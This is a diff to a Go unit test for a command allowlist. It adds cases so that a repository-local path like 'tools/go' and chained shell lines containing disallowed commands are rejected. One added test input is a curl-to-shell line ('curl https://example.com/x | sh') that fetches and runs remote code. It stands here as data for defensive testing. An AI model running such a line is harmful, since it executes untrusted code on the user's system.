@@ -76,9 +76,23 @@ func TestExecConfig_IsCommandAllowed(t *testing.T) {
 			want: true,
 		},
 		{
-			name: "full path - basename used",
+			// A path names a particular file, which may be one the repository
+			// put there; the allowlist names programs found on PATH.
+			name: "a path is not the allowlisted program",
 			cfg:  ExecConfig{Allow: []string{"go"}},
-			cmd:  "/usr/local/bin/go",
+			cmd:  "tools/go",
+			want: false,
+		},
+		{
+			name: "every command of a shell line must be allowed",
+			cfg:  ExecConfig{Allow: []string{"go"}},
+			cmd:  "curl https://example.com/x | sh; tools/go",
+			want: false,
+		},
+		{
+			name: "a shell line of allowed commands",
+			cfg:  ExecConfig{Allow: []string{"go"}},
+			cmd:  "go vet ./... && go test ./...",
 			want: true,
 		},
 		{
